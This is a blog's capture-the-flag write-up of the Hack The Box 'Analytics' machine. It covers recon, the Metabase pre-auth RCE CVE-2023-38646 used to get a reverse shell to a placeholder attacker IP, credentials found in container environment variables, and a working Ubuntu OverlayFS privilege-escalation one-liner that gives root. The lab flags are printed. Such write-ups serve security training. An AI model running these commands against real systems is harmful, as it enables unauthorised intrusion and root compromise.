<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Analytics | foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Analytics</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-16T17:14:31.000Z" id="date"> 2023-10-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-01-28T12:44:40.997Z" id="updated"> 2025-01-28</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px;">

  <!-- Image Section -->
  <div style="flex: 1 1 auto; max-width: 300px; text-align: center;" class='item-img' data-src='analytics.png'><img src="analytics.png" title="Analytics" width="300px" height="300px" style="pointer-events: none; max-width: 100%; height: auto;">
  </div>

  <!-- Details Section -->
  <div style="flex: 1 1 300px; display: flex; flex-direction: column; text-align: left;">
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
      <span style="margin-left: 5px;">Linux</span>
    </div>
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">Difficulty:</strong>
      <span>Easy</span>
    </div>
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">Author:</strong>
      <span>7u9y & TheCyberGeek</span>
    </div>
    <div style="display: flex; align-items: center;">
      <strong style="margin-right: 5px;">Release Date:</strong>
      <span>October 7, 2023</span>
    </div>
  </div>

</div>

<style>
  @media (max-width: 600px) {
    div[style*="display: flex; flex-wrap: wrap;"] {
      flex-direction: column;
      align-items: center;
    }

    div[style*="flex: 1 1 auto;"] {
      max-width: 100%;
      text-align: center;
    }

    div[style*="flex: 1 1 300px;"] {
      flex: 1 1 auto;
      max-width: 100%;
    }
  }
</style>



<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.233<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Analytics/nmapscan1.png'><img src="/HTB/Analytics/nmapscan1.png" alt="nmap scan"></p>
<p>We can see there is a http page running on port 80<br>Also we add the domain to the &#x2F;etc&#x2F;hosts file</p>
<p class='item-img' data-src='/HTB/Analytics/hosts1.png'><img src="/HTB/Analytics/hosts1.png" alt="/etc/hosts"></p>
<h3 id="Web-Page"><a href="#Web-Page" class="headerlink" title="Web Page"></a>Web Page</h3><p>After looking around the website, when I pressed the login button, it took me to the data.analytical.htb subdomain<br>So we update the hosts file again and we get a login page</p>
<p class='item-img' data-src='/HTB/Analytics/datasub.png'><img src="/HTB/Analytics/datasub.png" alt="login page url"><br class='item-img' data-src='/HTB/Analytics/hosts2.png'><img src="/HTB/Analytics/hosts2.png" alt="/etc/hosts 2"></p>
<p>The login page:<br class='item-img' data-src='/HTB/Analytics/loginpage1.png'><img src="/HTB/Analytics/loginpage1.png" alt="login page"></p>
<p>After searching for a Metabase exploit, I came across <a target="_blank" rel="noopener" href="https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396">CVE-2023-38646</a></p>
<p>This vulnerability allows us to execute code without any authentication</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="setup-token"><a href="#setup-token" class="headerlink" title="setup-token"></a>setup-token</h3><p>We head to the url specified in the previous <a target="_blank" rel="noopener" href="https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396">link</a> (data.analytical.htb&#x2F;api&#x2F;sessions&#x2F;properties) and search for setup-token</p>
<p class='item-img' data-src='/HTB/Analytics/setup-token.png'><img src="/HTB/Analytics/setup-token.png" alt="setup-token"><br>As we can see, the setup-token is leaking, which means it is vulnerable to the exploit</p>
<h3 id="Run-the-exploit"><a href="#Run-the-exploit" class="headerlink" title="Run the exploit"></a>Run the exploit</h3><p>Download the <a target="_blank" rel="noopener" href="https://github.com/securezeron/CVE-2023-38646">exploit</a></p>
<p>Setup a netcat listener.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1234<br></code></pre></td></tr></table></figure>

<p>While the listener is running, run the exploit</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/ --lhost &lt;Attacker IP&gt; --lport 1234<br></code></pre></td></tr></table></figure>

<p>After the exploit runs, we get a shell as the user metabase.<br class='item-img' data-src='/HTB/Analytics/shell1.png'><img src="/HTB/Analytics/shell1.png" alt="shell"></p>
<h3 id="Docker-Container"><a href="#Docker-Container" class="headerlink" title="Docker Container"></a>Docker Container</h3><p>We are now in a docker container.<br>However, if we check the environment variables, we get a user and password</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Analytics/env.png'><img src="/HTB/Analytics/env.png" alt="env command"></p>
<h3 id="SSH-and-user-flag"><a href="#SSH-and-user-flag" class="headerlink" title="SSH and user flag"></a>SSH and user flag</h3><p>We can now use the credentials obtained to ssh as the user metalytics</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh metalytics@10.10.11.233 <br></code></pre></td></tr></table></figure>
<p>We are now logged in as metalytics.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">whoami</span><br>metalytics <br></code></pre></td></tr></table></figure>
<p>We can now get the user.txt flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /home/metalytics/user.txt<br>a6c6422a0c214ffd37f50a632abeb48d<br></code></pre></td></tr></table></figure>

<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="Ubuntu-LPE"><a href="#Ubuntu-LPE" class="headerlink" title="Ubuntu LPE"></a>Ubuntu LPE</h3><p>No sudo commands can be run.<br>I searched for exploits on the running OS version, which is 22.04.2-Ubuntu</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">uname</span> -a<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Analytics/ubuntuversion.png'><img src="/HTB/Analytics/ubuntuversion.png" alt="Ubuntu Version"></p>
<p>I found this <a target="_blank" rel="noopener" href="https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/">Ubuntu LPE exploit</a></p>
<p>First i tried to run the command “id” and see if I would get root back</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;</span><br><span class="hljs-string">setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;id&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Analytics/rootuid.png'><img src="/HTB/Analytics/rootuid.png" alt="root uid"><br>We got the root id, which means the command is being executed as root</p>
<p>So I change the command to run a bash shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">unshare -<span class="hljs-built_in">rm</span> sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;</span><br><span class="hljs-string">setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>

<p>We now have a shell as root</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure>

<p>All we have left to do is get the root flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /root/root.txt<br>e7cea9c28a9c3460c2fd69964833561b<br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Visual/">← Next [HTB] Visual</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'foguh' Ferreira</a></h1><div id="description"><p>SOC Analyst</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Page"><span class="toc-number">1.2.</span> <span class="toc-text">Web Page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setup-token"><span class="toc-number">2.1.</span> <span class="toc-text">setup-token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-the-exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Run the exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Container"><span class="toc-number">2.3.</span> <span class="toc-text">Docker Container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-and-user-flag"><span class="toc-number">2.4.</span> <span class="toc-text">SSH and user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">3.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-LPE"><span class="toc-number">3.1.</span> <span class="toc-text">Ubuntu LPE</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>